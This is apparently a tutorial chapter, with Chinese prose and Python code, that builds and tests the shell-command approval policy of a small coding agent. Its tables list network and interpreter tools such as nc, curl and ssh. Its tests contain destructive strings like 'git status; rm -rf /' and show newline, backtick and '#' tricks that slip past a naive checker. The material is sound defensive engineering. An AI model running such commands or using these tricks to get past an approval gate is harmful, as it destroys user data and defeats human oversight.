**两张表，因为两个工具的可控程度不一样。** `apply_patch` 的每个路径都经过 `paths.resolve()`，"在仓库里"是代码真能确认的；
shell 命令不是。所以同一个 `workspace-write`，对 `apply_patch` 是放行，对会写文件的 shell 命令是询问。

> 这是第 2 章那条做法的第二次应用：第 2 章没实现 Windows 支持，就让测试明确说出 F02-10 的名字，而不是一片看不懂的失败。
> 这里同样：不做操作系统沙箱，就不让 `workspace-write` 冒充自己做到了。**缺口要说出自己的名字。**

代价是真的：在 `workspace-write` 下跑 `rm -rf build` 也要问一次。这个代价值得，因为另一个方向的错误无法挽回。

### 11.3 `policy.py`

把 §8–§11 收成一个模块。新建 `src/minicodex/policy.py`，全部内容：

```python
"""What a command is allowed to do, and who gets asked.

Two knobs, borrowed from codex because the split is the right one:

  `SandboxMode`     what the agent may do without anyone being asked
  `ApprovalPolicy`  what happens to everything else

They are separate because they answer different questions.  "May this agent
write files?" is about the task.  "Is there a human at the keyboard right now?"
is about the session.  A CI run wants `read-only` + `never`; a developer
watching the terminal wants `workspace-write` + `on-request`.  Folding them
into one setting makes the four useful combinations unreachable.

Both are string literals, not classes.  Three values that carry no behaviour of
their own are data; wrapping each in a class so `judge_command` can call
`mode.check()` would put three files where three strings do, and interlude B's
FB-03 is exactly the fault of introducing an interface with one implementation.
The dispatch below is a `match`, in one place, and stays readable at three
values.  If a fourth arrives with real behaviour behind it, that is the moment
to reconsider -- the third repetition, not the second.
"""

from __future__ import annotations

from dataclasses import dataclass
from enum import Enum
from typing import Literal

from minicodex.shell_parse import SEPARATORS, segments

SandboxMode = Literal["read-only", "workspace-write", "full-access"]
ApprovalPolicy = Literal["never", "on-request", "unless-trusted"]

SANDBOX_MODES: tuple[SandboxMode, ...] = ("read-only", "workspace-write", "full-access")
APPROVAL_POLICIES: tuple[ApprovalPolicy, ...] = ("never", "on-request", "unless-trusted")


class Decision(Enum):
    ALLOW = "allow"
    ASK = "ask"
    DENY = "deny"


class Risk(Enum):
    """What a single command segment does, worst case.

    Ordered: a command is as risky as the riskiest thing in it, and `max()`
    over this enum is how the segments of one command are combined.
    """

    READ = 0
    UNKNOWN = 1
    WRITE = 2
    NETWORK = 3
    INTERPRETER = 4

    def __lt__(self, other: Risk) -> bool:
        return self.value < other.value


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    risk: Risk
    # One sentence, written for two readers: the human at the approval prompt,
    # who needs to know what they are agreeing to, and the model, which gets it
    # back as tool output when the answer is no.
    reason: str


# -- the tables ------------------------------------------------------------
#
# Every table below is an allowlist except `INTERPRETERS`, and that one is not
# an exception so much as the proof of the rule: a command not on any list is
# UNKNOWN, which asks.  `INTERPRETERS` exists to stop a *rule* from ever being
# remembered for one of these, which is a different question -- see
# `rules.remember`.

# Commands that read and print.  Deliberately short.  Anything that takes a
# `--output`, an `-exec` or a `-i` belongs elsewhere, which is why `find`,
# `sed` and `rg` are absent: they are read-only *most* of the time, and "most
# of the time" is not a property an allowlist can express.
READ_ONLY = frozenset(
    {
        "basename",
        "cat",
        "cd",
        "date",
        "dirname",
        "echo",
        "false",
        "grep",
        "head",
        "ls",
        "nl",
        "pwd",
        "sort",
        "tail",
        "tree",
        "true",
        "uname",
        "uniq",
        "wc",
        "which",
        "whoami",
    }
)

# Commands whose whole purpose is to change something on disk.
WRITES = frozenset(
    {
        "chmod",
        "chown",
        "cp",
        "dd",
        "install",
        "kill",
        "ln",
        "mkdir",
        "mv",
        "rm",
        "rmdir",
        "shred",
        "tee",
        "touch",
        "truncate",
    }
)

# Commands that can move bytes off this machine, or pull code onto it.
# `pip` and `npm` are here whatever their subcommand: `pip download` fetches,
# `pip install` fetches *and executes* setup code.
NETWORK = frozenset(
    {
        "cargo",
        "curl",
        "gh",
        "nc",
        "ncat",
        "npm",
        "npx",
        "pip",
        "pip3",
        "pnpm",
        "rsync",
        "scp",
        "sftp",
        "ssh",
        "telnet",
        "uv",
        "wget",
        "yarn",
    }
)

# Anything that takes a program as an argument.  Chapter 5 measured why this
# cannot be handled by parsing: `python -c 'open("x","w")'` tokenises into
# three clean words, and no amount of shell analysis reaches inside the third
# one.  The interpreter is the boundary; past it, this module is blind.
#
# codex says the same thing in its own prompt, from the other direction --
# under "Banned prefix_rules": do not request `["python3"]`, `["python", "-"]`,
# "or other similar prefixes that would allow arbitrary scripting".
INTERPRETERS = frozenset(
    {
        "ash",
        "awk",
        "bash",
        "csh",
        "dash",
        "deno",
        "env",
        "eval",
        "exec",
        "fish",
        "irb",
        "ksh",
        "node",
        "perl",
        "php",
        "python",
        "python2",
        "python3",
        "ruby",
        "sh",
        "source",
        "tclsh",
        "xargs",
        "zsh",
    }
)

# -- git, which is not one command ----------------------------------------

# `git` on its own says nothing.  `git status` reads; `git push --force`
# rewrites someone else's history.  codex resolves this the same way, in
# `shell-command/src/command_safety/is_safe_command.rs`.
GIT_READ_ONLY_SUBCOMMANDS = frozenset(
    {"blame", "branch", "diff", "log", "ls-files", "rev-parse", "show", "status"}
)

# Subcommands that talk to a remote.  `git push --force` is the example the
# fault list names, and classifying it as a local write would understate it by
# a lot: the damage is on a server, and it is not undone by editing a file back.
GIT_NETWORK_SUBCOMMANDS = frozenset({"clone", "fetch", "pull", "push", "remote", "submodule"})

# Global options that appear *before* the subcommand and change what git
# operates on or runs.  `git -C /elsewhere status` reads a different
# repository; `git -c core.pager='rm -rf /' log` runs a command.  A checker
# that finds `status` and stops has approved neither of those.
GIT_UNSAFE_GLOBAL_OPTIONS = (
    "-C",
    "-c",
    "-p",
    "--paginate",
    "--git-dir",
    "--work-tree",
    "--exec-path",
    "--namespace",
    "--config-env",
    "--super-prefix",
)

# `git branch` lists branches; `git branch -d x` deletes one.  Same subcommand,
# and the difference is entirely in the arguments.
GIT_BRANCH_READ_ONLY_FLAGS = frozenset(
    {"--list", "-l", "--show-current", "-a", "--all", "-r", "--remotes", "-v", "-vv", "--verbose"}
)


def _git_risk(words: list[str]) -> Risk:
    for index, argument in enumerate(words[1:], start=1):
        if argument in GIT_UNSAFE_GLOBAL_OPTIONS or any(
            argument.startswith(f"{option}=") for option in GIT_UNSAFE_GLOBAL_OPTIONS
        ):
            return Risk.UNKNOWN
        if argument.startswith("-"):
            continue
        # The first bare word after `git` and its global options is the
        # subcommand.  `index` rather than `words.index(argument)`: the latter
        # finds the *first* occurrence, and `git log log` is a real thing to
        # type.
        if argument in GIT_NETWORK_SUBCOMMANDS:
            return Risk.NETWORK
        if argument not in GIT_READ_ONLY_SUBCOMMANDS:
            return Risk.WRITE
        rest = words[index + 1 :]
        if argument == "branch" and not all(
            flag in GIT_BRANCH_READ_ONLY_FLAGS or flag.startswith("--format=") for flag in rest
        ):
            return Risk.WRITE
        return Risk.READ
    return Risk.READ  # bare `git`, which prints usage


def classify(words: list[str]) -> Risk:
    """The worst thing one segment could do."""
    name = words[0].rsplit("/", 1)[-1]
    if name in INTERPRETERS:
        return Risk.INTERPRETER
    if name in NETWORK:
        return Risk.NETWORK
    if name in WRITES:
        return Risk.WRITE
    if name == "git":
        return _git_risk(words)
    if name in READ_ONLY:
        return Risk.READ
    return Risk.UNKNOWN


# -- putting it together ---------------------------------------------------

# What each sandbox mode lets a *shell command* do without asking.
#
# Note what `workspace-write` does not contain: `Risk.WRITE`.  That is not an
# oversight, it is the edge of what this layer can do.  "Write inside the
# workspace" is a statement about *where* bytes land, and for a shell command
# there is no way to find that out short of running it -- `rm -rf $HOME`,
# `rm -rf build` and `rm -rf ../../..` are the same shape, and a path argument
# is only a string until the shell expands it.
#
# The thing that enforces "inside the workspace" is an OS sandbox: seatbelt on
# macOS, landlock on Linux, a job object on Windows.  This chapter does not
# build one.  Rather than let `workspace-write` quietly mean "write anywhere",
# a writing shell command asks in every mode except `full-access`, and the gap
# says its own name -- the same treatment F02-10 got when Windows turned out to
# be unsupported.
_SHELL_ALLOWED_BY_MODE: dict[SandboxMode, frozenset[Risk]] = {
    "read-only": frozenset({Risk.READ}),
    "workspace-write": frozenset({Risk.READ}),
    "full-access": frozenset(Risk),
}

# `apply_patch` is the other half of that sentence.  Every path it touches goes
# through `paths.resolve()`, which resolves symlinks and `..` and then refuses
# anything outside the root -- so for this one tool, "inside the workspace" is
# a property the code can actually establish, and `workspace-write` means
# exactly what it says.
_WRITE_TOOL_ALLOWED_BY_MODE: dict[SandboxMode, bool] = {
    "read-only": False,
    "workspace-write": True,
    "full-access": True,
}

_WHY = {
    Risk.READ: "reads",
    Risk.UNKNOWN: "is not on any list, so what it does is unknown",
    Risk.WRITE: "changes files",
    Risk.NETWORK: "can reach the network",
    Risk.INTERPRETER: "runs an interpreter, which can do anything",
}


def judge_command(
    command: str,
    *,
    mode: SandboxMode,
    policy: ApprovalPolicy,
) -> Verdict:
    """Decide what happens to one `run_shell` command.

    Remembered rules are applied by the caller (`approval.gate`), not here, so
    that this function stays a pure statement of policy and can be tested
    without a rule store.
    """
    parts = segments(command)
    if parts is None:
        return _apply_policy(
            Risk.UNKNOWN,
            policy,
            "this command uses shell syntax the checker does not model "
            "(a newline, a substitution, a redirect, a wildcard or a quote it "
            "could not close), so no part of it was judged",
        )

    # A command is as safe as its least safe segment.  This is the whole answer
    # to `git status; rm -rf /`: the second segment is judged too.
    worst = max((classify(part) for part in parts), default=Risk.UNKNOWN)
    culprit = next(part for part in parts if classify(part) == worst)
    reason = f"{culprit[0]!r} {_WHY[worst]}"

    if worst in _SHELL_ALLOWED_BY_MODE[mode]:
        if policy == "unless-trusted" and worst is not Risk.READ:
            return Verdict(Decision.ASK, worst, reason)
        return Verdict(Decision.ALLOW, worst, reason)
    return _apply_policy(worst, policy, f"{reason}, which {mode} does not permit")


def judge_write(*, mode: SandboxMode, policy: ApprovalPolicy) -> Verdict:
    """`apply_patch` does exactly one thing, so there is nothing to classify."""
    if _WRITE_TOOL_ALLOWED_BY_MODE[mode]:
        if policy == "unless-trusted":
            return Verdict(Decision.ASK, Risk.WRITE, "editing files")
        return Verdict(Decision.ALLOW, Risk.WRITE, "editing files")
    return _apply_policy(Risk.WRITE, policy, f"editing files, which {mode} does not permit")


def _apply_policy(risk: Risk, policy: ApprovalPolicy, reason: str) -> Verdict:
    # `never` does not mean "allow"; it means there is nobody to ask.  Turning
    # an unanswerable question into a denial is the only honest option, and the
    # model has to be able to tell that denial apart from a failing command --
    # see `tool_errors.permission_error`.
    if policy == "never":
        return Verdict(Decision.DENY, risk, f"{reason}, and there is nobody to ask")
    return Verdict(Decision.ASK, risk, reason)


def policy_tables() -> dict[str, list[str]]:
    """Every table, in one shape, so a test can pin all of them at once.

    Chapter 3 pinned the tool descriptions this way and chapter 4 found out why
    it mattered.  These tables are worth more: a description that drifts costs
    accuracy, an allowlist that drifts costs containment, and an entry added to
    `READ_ONLY` in a hurry looks exactly like an entry that belongs there.
    """
    return {
        "READ_ONLY": sorted(READ_ONLY),
        "WRITES": sorted(WRITES),
        "NETWORK": sorted(NETWORK),
        "INTERPRETERS": sorted(INTERPRETERS),
        "GIT_READ_ONLY_SUBCOMMANDS": sorted(GIT_READ_ONLY_SUBCOMMANDS),
        "GIT_NETWORK_SUBCOMMANDS": sorted(GIT_NETWORK_SUBCOMMANDS),
        "GIT_UNSAFE_GLOBAL_OPTIONS": sorted(GIT_UNSAFE_GLOBAL_OPTIONS),
        "GIT_BRANCH_READ_ONLY_FLAGS": sorted(GIT_BRANCH_READ_ONLY_FLAGS),
        "SEPARATORS": sorted(SEPARATORS),
    }
```

没在前面几节出现过的部分：

> - **开头的 docstring** 解释了为什么两个开关是字符串（`Literal`）而不是类：三个没有自己行为的取值就是数据，
>   给每个值写一个类只会把三个字符串变成三个文件。docstring 里提到的"interlude B 的 FB-03"是后面一篇插曲
>   （讲"边界"的那篇）里的一条故障，意思是"为只有一种实现的东西引入接口"。
> - **`SANDBOX_MODES`、`APPROVAL_POLICIES`**：把合法取值列成元组，后面命令行参数的 `choices=` 会用到。
> - **`Decision`**：三种结论——放行（ALLOW）、问（ASK）、拒绝（DENY）。**`Risk`**：一段命令最坏能做什么，
>   按危险程度从低到高编号：READ(0) < UNKNOWN(1) < WRITE(2) < NETWORK(3) < INTERPRETER(4)。
>   "不认识"排在"只读"之上、"写"之下：它可能什么都不做，也可能做任何事，但至少我们没见到它明确要改东西。
>   类里定义了 `__lt__`（"小于"比较），`max()` 靠它取出"最危险的那一段"。
> - **`Verdict`**：一次判断的结果——结论、风险、以及一句人能读懂的理由。
> - **`_git_risk(words)`**：§8 的完整实现。逐个看 `git` 后面的词：遇到危险的全局选项就返回"不认识"；
>   以 `-` 开头的选项跳过；第一个不以 `-` 开头的词就是子命令——网络类返回 NETWORK，不在只读表里返回 WRITE；
>   `branch` 还要检查后面的每个选项都在只读选项表里（`all([])` 对空列表是 `True`，所以光一个 `git branch` 算只读）。
>   `enumerate(words[1:], start=1)` 同时给出每个词和它在 `words` 里的位置；用这个位置，而不是 `words.index(argument)`
>   （后者找的是**第一次出现**的位置，遇到重复的词就会找错）。光一个 `git` 会打印用法，算只读。
> - **`classify` 上方的几张表**：每张表上面的注释说明了它的边界。`READ_ONLY` 的注释解释了为什么常见的 `find`、`sed`、`rg`
>   **不在**里面：它们大部分时候只读，但有能写或能执行的选项（`find -exec`、`sed -i`），"大部分时候只读"不是允许名单能表达的。
> - **`_WHY`**：每种风险对应的一句人话，用来拼出"`'rm' changes files`"这样具体的理由。
> - **`judge_command(command, mode=, policy=)`**：先分段；分不了（`None`）就当成"不认识"交给策略。
>   分得了，就对每一段 `classify`，**取最危险的一段**——这就是对 `git status; rm -rf /` 的全部回答。
>   `culprit` 是造成这个风险的那一段，理由里说的就是它。风险在当前模式允许的范围内就放行
>   （`unless-trusted` 策略下，只读以外的都要问）；否则交给 `_apply_policy`。
>   docstring 说明了为什么**这里不看记住的规则**：规则由上一层处理，这个函数保持为纯粹的"策略"，不用规则库也能测试。
> - **`judge_write`**：`apply_patch` 只做一件事（改文件），不需要分类。
> - **`policy_tables()`**：把所有表收成一个字典，供测试一次性"钉死"（见下一小节末尾）。

### 11.4 测试，然后第一次提交

在 `tests/test_approval.py` 里加上开头和前五组故障的测试：

```python
"""Chapter 5: approval and sandboxing.

One test per fault in FAULTS.md, named after it.  Three of these -- the
newline, the backtick and the `#` -- are not on the chapter's fault list at
all: they were found by feeding a checker that already handled `;` the things
next to `;`, and every one of them was a silent bypass verified against real
bash.

    grep -rn "F05_01" tests/
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from minicodex.approval import (
    AllowAll,
    ApprovalReply,
    ApprovalRequest,
    CliApprover,
    DenyAll,
    Session,
    gate_command,
    permissions_block,
    request_upgrade,
)
from minicodex.policy import Decision, Risk, judge_command, judge_write, policy_tables
from minicodex.rules import RuleRefused, RuleStore, check_rule
from minicodex.shell import ShellSession
from minicodex.shell_parse import segments
from minicodex.tool_errors import ERROR_PREFIX, PERMISSION_PREFIX, permission_error, tool_error
from minicodex.tools import ToolContext, default_tools, request_permissions, run_shell


def _decision(command: str, *, mode="read-only", policy="on-request") -> Decision:
    return judge_command(command, mode=mode, policy=policy).decision


# ---------------------------------------------------------------------------
# F05-01  string prefix matching is defeated by a separator
# ---------------------------------------------------------------------------


def test_F05_01_a_prefix_allowlist_approves_the_whole_line() -> None:
    """The naive version, kept so the fault is reproducible, not just described.

    `str.startswith` answers a question about the first N characters. Whether a
    command is safe is a question about all of them.
    """
    safe_prefixes = ("ls", "cat", "git status")
    assert "git status; rm -rf /".startswith(safe_prefixes)


def test_F05_01_every_segment_is_judged_not_only_the_first() -> None:
    assert segments("git status; rm -rf /") == [["git", "status"], ["rm", "-rf", "/"]]
    assert _decision("git status; rm -rf /") is Decision.ASK
    assert _decision("git status") is Decision.ALLOW


@pytest.mark.parametrize("separator", [";", "&&", "||", "|"])
def test_F05_01_all_four_separators_split(separator: str) -> None:
    assert _decision(f"ls {separator} rm -rf /") is Decision.ASK


def test_F05_01_a_separator_without_spaces_still_splits() -> None:
    """`shlex.split()` would return `['git', 'status;rm', ...]`.

    `punctuation_chars=True` is what makes the separator its own token, and it
    is the entire reason this module does not use the one-liner.
    """
    assert segments("git status;rm -rf /") == [["git", "status"], ["rm", "-rf", "/"]]


# ---------------------------------------------------------------------------
# Not on the list: three ways a tokeniser sees less than bash runs
# ---------------------------------------------------------------------------


def test_F05_01_a_newline_is_a_separator_bash_honours_and_shlex_eats() -> None:
    """`ls\\nrm -rf x`: shlex reports one command called `ls`; bash runs two.

    Verified against real bash on a real file, in probe_shell_safety.py: the
    file was gone afterwards. Without the character check this reaches
    `Decision.ALLOW`, because the segment's first word is on the read-only list.
    """
    import shlex

    lex = shlex.shlex("ls\nrm -rf x", posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    assert list(lex) == ["ls", "rm", "-rf", "x"], "shlex swallows the newline"

    assert segments("ls\nrm -rf x") is None
    assert _decision("ls\nrm -rf x") is Decision.ASK


def test_F05_01_a_backtick_is_glued_into_a_word() -> None:
    import shlex

    lex = shlex.shlex("echo `rm -rf x`", posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    assert list(lex) == ["echo", "`rm", "-rf", "x`"], "the substitution is invisible"

    assert segments("echo `rm -rf x`") is None
    assert _decision("echo `rm -rf x`") is Decision.ASK


def test_F05_01_a_hash_mid_word_hides_the_rest_of_the_line() -> None:
    """The worst of the three, because what disappears is unbounded.

    `shlex` treats `#` as starting a comment. bash only does so at the start of
    a word. So `echo a#b; rm -rf x` tokenises to `['echo', 'a']` -- one
    segment, first word on the allowlist, and the `rm` is not merely
    misjudged, it was never seen.
    """
    import shlex

    lex = shlex.shlex("echo a#b; rm -rf x", posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    assert list(lex) == ["echo", "a"], "everything after the # is gone"

    assert segments("echo a#b; rm -rf x") is None
    assert _decision("echo a#b; rm -rf x") is Decision.ASK


def test_F05_01_an_unmodelled_character_asks_rather_than_allows() -> None:
    """The rule that closed all three at once, stated directly.

    An allowlist of characters, not a blocklist of constructs: something
    nobody thought of defaults to a question. Chapter 2 made the same call
    about the subprocess environment, for the same reason.
    """
    for command in (
        "cat a > b",
        "cat < a",
        "echo $(id)",
        "echo $HOME",
        "rm *.py",
        "ls [ab]*",
        "FOO=bar env",
        "ls\ttab",  # a tab is modelled -- this one is allowed, as a control
    ):
        parsed = segments(command)
        if command == "ls\ttab":
            assert parsed == [["ls", "tab"]]
        else:
            assert parsed is None, command


def test_F05_01_an_unclosed_quote_becomes_a_question_not_an_exception() -> None:
    """`shlex` raises `ValueError: No closing quotation`.

    Chapter 0's rule: an exception where the model can see it ends the session.
    """
    assert segments('ls "unterminated') is None
    assert _decision('ls "unterminated') is Decision.ASK


def test_F05_01_punctuation_that_is_not_one_of_the_four_is_unknown() -> None:
    assert segments("ls;;rm") is None
    assert segments("sleep 30 & ls") is None
    assert segments("; ls") is None
    assert segments("ls ;") is None


# ---------------------------------------------------------------------------
# F05-02  git allowed wholesale, including push --force
# ---------------------------------------------------------------------------


def test_F05_02_git_is_judged_by_its_subcommand() -> None:
    assert _decision("git status") is Decision.ALLOW
    assert _decision("git log --oneline") is Decision.ALLOW
    assert _decision("git push --force") is Decision.ASK
    assert _decision("git reset --hard") is Decision.ASK


def test_F05_02_a_remote_subcommand_is_network_not_a_local_write() -> None:
    """`git push --force` damages a server. Calling it a file edit understates it,
    and `workspace-write` would then have let it through."""
    assert judge_command("git push --force", mode="workspace-write", policy="on-request").risk is (
        Risk.NETWORK
    )


def test_F05_02_global_options_before_the_subcommand_are_not_skipped() -> None:
    """`git -C /elsewhere status` reads a different repository.
    `git -c core.pager=... log` runs a command of its own choosing.

    A checker that scans for a known subcommand and stops has approved both.
    """
    assert _decision("git -C /elsewhere status") is Decision.ASK
    assert _decision("git --git-dir=/other/.git log") is Decision.ASK


def test_F05_02_git_branch_is_read_only_only_with_read_only_flags() -> None:
    assert _decision("git branch") is Decision.ALLOW
    assert _decision("git branch --show-current") is Decision.ALLOW
    assert _decision("git branch -d feature") is Decision.ASK
    assert _decision("git branch newbranch") is Decision.ASK


# ---------------------------------------------------------------------------
# F05-03  ../.. and symlinks defeat string comparison
# ---------------------------------------------------------------------------


def test_F05_03_a_relative_climb_is_refused(tmp_path: Path) -> None:
    """Inherited from chapter 4, which fixed it by resolving before judging.

    Re-tested here rather than reimplemented: the finding worth recording is
    that this was already closed, and the way to know that is a test, not a
    reading of the code.
    """
    from minicodex.paths import resolve

    path, error = resolve("../../../../etc/passwd", tmp_path)
    assert path is None
    assert error is not None and "outside the repository" in error


@pytest.mark.skipif(not hasattr(Path, "symlink_to"), reason="platform has no symlinks")
def test_F05_03_a_symlink_pointing_out_is_refused(tmp_path: Path) -> None:
    """The case a string comparison cannot see at all.

    `root/link` starts with `root`, character for character, and points
    somewhere else entirely. `Path.resolve()` follows it, which is why chapter
    4's "resolve first, judge second" happens to cover this too.
    """
    from minicodex.paths import resolve

    outside = tmp_path.parent / "outside.txt"
    outside.write_text("secret\n", encoding="utf-8")
    root = tmp_path / "repo"
    root.mkdir()
    try:
        (root / "link").symlink_to(outside)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation needs privileges on this platform")

    assert str(root / "link").startswith(str(root)), "a string comparison says yes"

    path, error = resolve("link", root)
    assert path is None, "resolve() follows the link and says no"
    assert error is not None and "outside the repository" in error


# ---------------------------------------------------------------------------
# F05-04  an interpreter defeats every amount of shell parsing
# ---------------------------------------------------------------------------


def test_F05_04_an_interpreter_tokenises_perfectly_cleanly() -> None:
    """There is nothing wrong with the parse. That is the point."""
    assert segments("python script.py") == [["python", "script.py"]]
    assert _decision("python script.py") is Decision.ASK
    assert _decision("python script.py", mode="workspace-write") is Decision.ASK


@pytest.mark.parametrize("interpreter", ["python", "python3", "node", "perl", "ruby", "sh", "bash"])
def test_F05_04_no_interpreter_is_ever_auto_allowed(interpreter: str) -> None:
    """Asserts the risk, not only the decision.

    Mutation testing caught this: deleting the `INTERPRETERS` branch from
    `classify` left every test green, because an unclassified command falls
    through to `UNKNOWN`, which also asks. Same decision, different sentence --
    and the sentence is what the human at the prompt reads before saying yes.
    "'python' runs an interpreter, which can do anything" and "'python' is not
    on any list" are not the same warning.
    """
    for mode in ("read-only", "workspace-write"):
        verdict = judge_command(f"{interpreter} thing.txt", mode=mode, policy="on-request")
        assert verdict.decision is Decision.ASK
        assert verdict.risk is Risk.INTERPRETER
        assert "interpreter" in verdict.reason


def test_F05_04_an_interpreter_hidden_behind_a_pipe_is_still_found() -> None:
    assert _decision("cat setup.py | python") is Decision.ASK


# ---------------------------------------------------------------------------
# F05-05  curl exfiltrates; pip install pulls a malicious package
# ---------------------------------------------------------------------------


def test_F05_05_network_commands_are_their_own_category() -> None:
    for command in ("curl https://x", "wget https://x", "pip install requests", "npm install"):
        verdict = judge_command(command, mode="workspace-write", policy="on-request")
        assert verdict.decision is Decision.ASK, command
        assert verdict.risk is Risk.NETWORK, command


def test_F05_03_workspace_write_does_not_let_a_shell_command_write(tmp_path: Path) -> None:
    """The most consequential decision in this chapter, and mutation testing
    found nothing was testing it.

    `workspace-write` means "write inside the workspace". For `apply_patch`
    that is enforceable -- every path goes through `paths.resolve()`. For a
    shell command it is not: `rm -rf build` and `rm -rf ~` are the same shape,
    and the expansion happens after we have stopped looking. Enforcing it
    needs an OS sandbox, which this chapter does not build.

    So a writing shell command asks in `workspace-write` too, and the two
    tools deliberately differ. Flipping `_SHELL_ALLOWED_BY_MODE` to include
    WRITE -- which is the natural-looking "fix" for the asymmetry -- left all
    202 tests green before this existed.
    """
    assert _decision("rm -rf /", mode="workspace-write") is Decision.ASK
    assert _decision("rm -rf ~", mode="workspace-write") is Decision.ASK
    assert _decision("mv src dst", mode="workspace-write") is Decision.ASK

    # ...while the tool whose paths we control does not ask.
    assert judge_write(mode="workspace-write", policy="on-request").decision is Decision.ALLOW


def test_F05_03_full_access_is_the_only_mode_that_lets_a_shell_write() -> None:
    """And it is called `full-access` so that nobody chooses it by accident."""
    assert _decision("rm -rf /", mode="full-access") is Decision.ALLOW
    assert _decision("rm -rf /", mode="read-only") is Decision.ASK


def test_F05_05_network_is_not_reachable_by_widening_the_file_sandbox() -> None:
    """`workspace-write` is about files. Nothing about it should imply network,
    and the fault list has a real incident behind this one (marked user report)."""
    assert _decision("curl https://x", mode="workspace-write") is Decision.ASK


```

> - 开头 import 了这一章所有要测的东西；`approval`、`rules`、`tools` 里的那些要到后面几节才写出来。
>   **动手时，先只保留本节用到的 import**（`policy`、`shell_parse`、`paths` 相关），后面每加一组测试再补。
> - **`_decision(...)`**：一个小帮手，只返回判断的结论。
> - **F05-01**：看开头的检查放行了整行（证明第一版的问题）；每一段都被判断；四个分隔符各测一次
>   （`parametrize`）；没有空格也能切开。
> - **"Not on the list" 那一组**：换行、反引号、`#` 三种绕过，各一个测试；不认识的字符变成"问"而不是"放行"；
>   没闭合的引号变成"问"而不是异常；`;;` 这类标点变成"不认识"。
> - **F05-02**：按子命令判断；远程子命令是 NETWORK；子命令前的全局选项不会被跳过；`git branch` 只有带只读选项时才算只读。
> - **F05-03**：相对路径往上爬被拒绝；指向外面的符号链接被拒绝（§10，在 Windows 上会跳过）。
> - **F05-04**：解释器的参数分词完美（证明分词帮不上忙）；任何解释器都不会被自动放行；藏在管道后面的解释器也能找到。
>   第二个测试除了结论，还检查了**风险**是 `INTERPRETER`。它的 docstring 记下了原因：做变异测试时，把 `classify`
>   里判断解释器的那两行删掉，所有测试依然全绿——因为不认识的命令落到 `UNKNOWN`，结论同样是"问"。
>   **结论一样，理由不一样**，而理由正是人在审批时读到的那句话。
> - **F05-05 和两个挂在 F05-03 名下的测试**：网络命令是单独一类（结论和风险都检查）；放宽文件沙箱不会连网络一起放开。
>   中间两个测试检查 §11.2 的决定：`workspace-write` 不会让 shell 命令写文件、只有 `full-access` 允许。
>   它们挂在 F05-03 名下，因为这件事说到底是"写到了哪里"的问题。docstring 里说，在这个测试出现之前，
>   把 `WRITE` 加进 `workspace-write`——看起来最自然的"修复"——当时的 202 个测试全绿。**最重要的决定，
>   也最需要一个会因它变红的测试。**

再加上"钉死策略表"和"表之间不重叠"的测试，放在文件末尾：

```python
# ---------------------------------------------------------------------------
# The tables themselves
# ---------------------------------------------------------------------------

# Chapter 3 pinned the tool descriptions; a description that drifts costs
# accuracy. These cost containment: an entry added to READ_ONLY in a hurry
# looks exactly like an entry that belongs there, and nothing else in the suite
# would notice.
EXPECTED_TABLES = {
    "GIT_BRANCH_READ_ONLY_FLAGS": [
        "-a",
        "-l",
        "-r",
        "-v",
        "-vv",
        "--all",
        "--list",
        "--remotes",
        "--show-current",
        "--verbose",
    ],
    "GIT_NETWORK_SUBCOMMANDS": ["clone", "fetch", "pull", "push", "remote", "submodule"],
    "GIT_READ_ONLY_SUBCOMMANDS": [
        "blame",
        "branch",
        "diff",
        "log",
        "ls-files",
        "rev-parse",
        "show",
        "status",
    ],
    "GIT_UNSAFE_GLOBAL_OPTIONS": [
        "-C",
        "-c",
        "-p",
        "--config-env",
        "--exec-path",
        "--git-dir",
        "--namespace",
        "--paginate",
        "--super-prefix",
        "--work-tree",
    ],
    "INTERPRETERS": [
        "ash",
        "awk",
        "bash",
        "csh",
        "dash",
        "deno",
        "env",
        "eval",
        "exec",
        "fish",
        "irb",
        "ksh",
        "node",
        "perl",
        "php",
        "python",
        "python2",
        "python3",
        "ruby",
        "sh",
        "source",
        "tclsh",
        "xargs",
        "zsh",
    ],
    "NETWORK": [
        "cargo",
        "curl",
        "gh",
        "nc",
        "ncat",
        "npm",
        "npx",
        "pip",
        "pip3",
        "pnpm",
        "rsync",
        "scp",
        "sftp",
        "ssh",
        "telnet",
        "uv",
        "wget",
        "yarn",
    ],
    "READ_ONLY": [
        "basename",
        "cat",
        "cd",
        "date",
        "dirname",
        "echo",
        "false",
        "grep",
        "head",
        "ls",
        "nl",
        "pwd",
        "sort",
        "tail",
        "tree",
        "true",
        "uname",
        "uniq",
        "wc",
        "which",
        "whoami",
    ],
    "SEPARATORS": [";", "&&", "|", "||"],
    "WRITES": [
        "chmod",
        "chown",
        "cp",
        "dd",
        "install",
        "kill",
        "ln",
        "mkdir",
        "mv",
        "rm",
        "rmdir",
        "shred",
        "tee",
        "touch",
        "truncate",
    ],
}


def test_F05_07_the_policy_tables_are_pinned() -> None:
    actual = policy_tables()
    for name, expected in EXPECTED_TABLES.items():
        assert sorted(actual[name]) == sorted(expected), name
    assert set(actual) == set(EXPECTED_TABLES)


def test_F05_04_no_command_is_in_two_tables() -> None:
    """Overlap is not caught by anything else, and `classify` checks in a fixed
    order -- so an entry in two tables silently takes whichever comes first."""
    tables = policy_tables()
    names = ["READ_ONLY", "WRITES", "NETWORK", "INTERPRETERS"]
    for i, first in enumerate(names):
        for second in names[i + 1 :]:
            overlap = set(tables[first]) & set(tables[second])
            assert not overlap, f"{first} and {second} both contain {sorted(overlap)}"
```

> - **`EXPECTED_TABLES`**：每张表的完整内容抄一遍；比较时两边都 `sorted`，所以顺序不重要，内容一个都不能差。上面的注释说明了为什么这些表比工具描述更值得钉死：
>   描述漂移损失的是准确率，名单漂移损失的是**安全边界**。往 `READ_ONLY` 里匆忙加一个 `find`，在改动里就是一行，
>   审查时看起来和别的条目一模一样——**加进去之后 `find -delete` 就自动放行了**。
> - **`test_F05_04_no_command_is_in_two_tables`**：把四张命令表（只读、写、网络、解释器）两两比较，不许有交集。
>   `names[i + 1 :]` 保证每一对只比一次。

```bash
git add src/minicodex/shell_parse.py src/minicodex/policy.py tests/test_approval.py
git commit -m "feat: judge shell commands by segment, not by prefix"
```

> 这个提交只有两个纯函数模块和它们的测试，不接到任何工具上。它们可以在没有 Agent 的情况下完整审查——
> 而这一章最需要被仔细读的就是它们。**把最需要审查的代码，放进最小的提交里。**

